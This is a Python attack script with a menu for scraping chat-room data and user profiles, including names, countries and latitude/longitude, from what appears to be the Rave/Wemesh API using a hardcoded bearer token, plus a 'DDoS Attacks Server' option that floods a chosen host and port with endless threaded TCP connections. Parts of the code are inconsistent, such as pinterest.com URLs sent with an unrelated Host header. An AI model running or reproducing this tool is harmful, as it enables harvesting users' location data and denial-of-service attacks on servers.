import requests
import os, sys
import json
from time import sleep
import os
try:
   from colorama import Fore,init
   init()
except ImportError:
    os.system("pip3 install colorama")
import time
import sys
import socket
import threading
import platform
green_color = "\033[1;32m"
red_color = "\033[1;31m"
detect_color = "\033[1;34m"
banner_color = "\033[1;33;40m"
end_banner_color = "\33[00m"

r = requests.session ()

print (detect_color + """


1- Extract all ROM
2- fetch user data 
3- list data user id room
4- DDoS Attacks Server
---------------------------------------
""")
falah = input ("-> ")
os.system ('clear')
print ('\nsleeping 5 min..')
sleep (5)
os.system ('clear')
sleep (5)
if falah == '1':
    ss = int(input(end_banner_color + 'How many ROM do you want? -> '))
    url ="https://pinterest.com//meshes/self?deviceId=0AF99238F629407CA0889D72683B423E&lang=ar&limit=10000&public=true"
    headers = {
    "Accept": "*/*",
    "User-Agent": "Rave/1541 CFNetwork/1206 Darwin/20.1.0",
    "Authorization": "Bearer 0aaeec5219f7be46840ec732043074cb",
    "Host": "api.red.wemes.co.global.prod.fastly.net",
    "Wemesh-Api-Version":"3.0",
    "Wemesh-Platform": "ios",
    "Client-Version": "5.5.3"
}
    response = requests.request ("GET", url, headers=headers).text
    info = json.loads (response)

    for i in range (ss):
        if 'data' in response:
            try:
                print (red_color + "---------------------------------------")
                print (green_color + " --> server : "+ "|" + str (info["data"][i]["mesh"]["server"] +"|"))
                print (green_color + " --> id room : " + "|" + str (info["data"][i]["mesh"]["id"] + "|"))
                print (green_color + " --> from : "+ "|" + str (info["data"][i]["mesh"]["videoProvider"] +"|"))
                print (green_color + " --> room picture : " + "|" + str (info["data"][i]["mesh"]["thumbnails"]["high"] ))
                print (green_color + " --> name admin : " + "|" + str (info["data"][i]["users"][i]["name"] +"|"))
                print (green_color + " --> country : " + "|" + str (info["data"][i]["users"][i]["country"] + "|"))
                print (green_color + " --> lat : " + "|" + str (info["data"][i]["users"][i]["lat"] + "|"))
                print (green_color + " --> lng : " + "|" + str (info["data"][i]["users"][i]["lng"] + "|"))
            except:
                print ("---E----N----D")

if falah == '2':
    flo =  input(end_banner_color + 'username? -> ')
    url ="https://pinterest.com/users/search?all=true&q="+flo+""
    headers = {
    "Accept": "*/*",
    "User-Agent": "Rave/1541 CFNetwork/1206 Darwin/20.1.0",
    "Authorization": "Bearer 0aaeec5219f7be46840ec732043074cb",
    "Host": "api.red.wemes.co.global.prod.fastly.net",
    "Wemesh-Api-Version":"3.0",
    "Wemesh-Platform": "ios",
    "Client-Version": "5.5.3"
}
    response = requests.request ("GET", url, headers=headers).text
    info = json.loads (response)
    if 'data' in response:
            try:
                print (red_color + "---------------------------------------")
                print (green_color  + str (info["data"]))
            except:
                print ("---E----N----D")

if falah == '3':
    flo = input (end_banner_color + 'id room? -> ')
    url = "https://pinterest.com/meshes/" + flo + ""
    headers = {
        "Accept": "*/*",
        "User-Agent": "Rave/1541 CFNetwork/1206 Darwin/20.1.0",
        "Authorization": "Bearer 0aaeec5219f7be46840ec732043074cb",
        "Host": "api.red.wemes.co.global.prod.fastly.net",
        "Wemesh-Api-Version": "3.0",
        "Wemesh-Platform": "ios",
        "Client-Version": "5.5.3"
    }
    response = requests.request ("GET", url, headers=headers).text
    info = json.loads (response)
    if 'data' in response:
        try:
            print (red_color + "---------------------------------------")
            print (green_color + str (info["data"]))
        except:
            print ("---E----N----D")

if falah == '4':
    class color:
        red = '\033[91m'
        green = '\033[92m'
        End = '\033[0m'
        blue = '\033[33m'
    print(color.green + """
     ______   ______   _______  _______         _______  _______  _______  _______  _______  ___   _
    |      | |      | |       ||       |       |   _   ||       ||       ||   _   ||       ||   | | |
    |  _    ||  _    ||   _   ||  _____| ____  |  |_|  ||_     _||_     _||  |_|  ||       ||   |_| |   
    | | |   || | |   ||  | |  || |_____ |____| |       |  |   |    |   |  |       ||       ||      _|
    | |_|   || |_|   ||  |_|  ||_____  |       |       |  |   |    |   |  |       ||      _||     |_
    |       ||       ||       | _____| |       |   _   |  |   |    |   |  |   _   ||     |_ |    _  |
    |______| |______| |_______||_______|       |__| |__|  |___|    |___|  |__| |__||_______||___| |_|\n""" + color.blue + """
         ----[    This code write by (Mr.nope)   ]---
        -------[ github :""" + color.blue + """ https://github.com/mrprogrammer2938 ]-----------""" + color.End)

    os.system ('clear')
    host = input ("\nEnter Host: ")
    time.sleep (1)
    port = int (input ("\nEnter Target port: "))
    ##################################################
    UDP_PORT = port
    time.sleep (1)
    os.system ('clear')
    ip = socket.gethostbyname (host)
    print (color.red + "=============================================================================\n" + color.End)
    print ("Target IP:", ip)
    time.sleep (1)
    print ("\nTarget port:", UDP_PORT)
    print (color.red + "=============================================================================\n" + color.End)
    time.sleep (2)


    def run(k):
        while True:
            s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
            s.connect ((host, port))
            print (f"Packet send To {ip}")


    for i in range (10):
        ch = threading.Thread (target=run, args=[i])
        ch.start ()
        sleep (60)
        os.system ('clear')

# Thanks For using :)
